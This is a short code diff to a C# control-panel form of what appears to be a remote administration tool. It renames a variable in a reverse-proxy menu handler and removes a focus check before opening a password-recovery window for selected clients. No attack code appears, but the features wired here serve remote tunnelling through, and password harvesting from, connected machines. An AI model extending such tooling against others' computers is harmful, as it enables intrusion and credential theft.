@@ -598,8 +598,8 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                FrmReverseProxy frmRS = new FrmReverseProxy(GetSelectedClients());
-                frmRS.Show();
+                FrmReverseProxy frmRs = new FrmReverseProxy(GetSelectedClients());
+                frmRs.Show();
             }
         }
 
@@ -666,12 +666,6 @@ namespace xServer.Forms
         {
             foreach (Client c in GetSelectedClients())
             {
-                if (c.Value.FrmPass != null)
-                {
-                    c.Value.FrmPass.Focus();
-                    return;
-                }
-
                 FrmPasswordRecovery frmPass = new FrmPasswordRecovery(GetSelectedClients());
                 frmPass.Show();
             }
